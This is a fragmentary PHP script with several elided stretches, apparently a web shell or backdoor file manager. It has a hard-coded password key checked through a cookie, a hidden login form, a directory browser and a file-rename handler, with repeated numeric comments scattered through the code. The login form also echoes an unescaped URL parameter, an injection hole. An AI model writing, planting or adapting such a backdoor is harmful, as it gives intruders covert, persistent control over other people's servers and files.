...
$auth_key = "71bef4b9381bc2b3dc2fed8dd9d5d64d";
...
$pass = false;
if (isset($_COOKIE['pw_name_67331'])) {
    if(($_COOKIE['pw_name_67331']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_67331'])) {
        if(($_POST['pw_name_67331']) == $auth_key) {
            setcookie("pw_name_67331", $_POST['pw_name_67331']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_67331' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1737088878297043 1737088878240549 1737088878214772 1737088878419139
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1737088878297043 1737088878240549 1737088878214772 1737088878419139
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1737088878297043 1737088878240549 1737088878214772 1737088878419139
            $name = PATH . "/" . $_GET['r'];
